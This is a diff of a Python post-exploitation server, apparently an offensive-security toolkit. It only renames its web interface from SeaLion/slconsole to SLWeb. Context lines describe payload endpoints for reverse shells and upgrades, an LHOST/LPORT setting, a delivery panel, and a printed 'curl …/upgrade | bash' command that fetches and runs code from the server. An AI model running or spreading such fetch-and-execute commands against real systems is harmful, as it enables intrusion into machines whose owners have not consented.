@@ -3,7 +3,7 @@
 Server HTTP in background che serve utility di post-exploitation:
   - Endpoint dinamici (/upgrade, /rev, /sh) che generano payload al volo
   - File statici dalla cartella static/ (linpeas.sh, winpeas.exe, ecc.)
-  - Piattaforma web per consultare notes, vuln e tools
+  - Piattaforma web SLWeb per consultare notes, vuln e tools
 """
 from __future__ import annotations
 
@@ -370,7 +370,7 @@ def _base_html(title: str, body: str, active: str = "") -> str:
     return f"""<!DOCTYPE html>
 <html lang="it"><head>
 <meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1">
-<title>{html.escape(title)} — SeaLion</title>
+<title>{html.escape(title)} — SLWeb</title>
 <link rel="stylesheet" href="{_CSS_HLJS}">
 <style>{_CSS}</style>
 <script src="{_JS_MARKED}"></script>
@@ -378,7 +378,7 @@ def _base_html(title: str, body: str, active: str = "") -> str:
 </head><body>
 <div class="topbar">
 <div class="topbar-left">
-<a href="/" class="logo"><span class="prompt">&gt;_</span> slconsole</a>
+<a href="/" class="logo"><span class="prompt">&gt;_</span> SLWeb</a>
 <nav>{nav_html}</nav>
 </div>
 </div>
@@ -433,7 +433,7 @@ def _page_home() -> str:
   <div class="terminal-input">
     <div class="suggestions" id="suggestions"></div>
     <div class="prompt-line">
-      <span class="user">user@slconsole</span>:<span class="path">~</span>$&nbsp;
+      <span class="user">user@slweb</span>:<span class="path">~</span>$&nbsp;
       <input type="text" id="term-input" placeholder="notes, vuln, tools, static..." autocomplete="off" spellcheck="false">
     </div>
   </div>
@@ -970,7 +970,7 @@ def start(port: int = 2727, lhost: str | None = None, lport: int = 4444) -> str:
         f"Server attivo su \033[92m{base}\033[0m  "
         f"(LHOST={_lhost}  LPORT={_lport})",
         "",
-        f"  \033[96mPiattaforma web:\033[0m  {base}",
+        f"  \033[96mSLWeb:\033[0m            {base}",
         f"  \033[96mDelivery panel:\033[0m   {base}/delivery",
         "",
         f"  curl {base}/upgrade | bash",
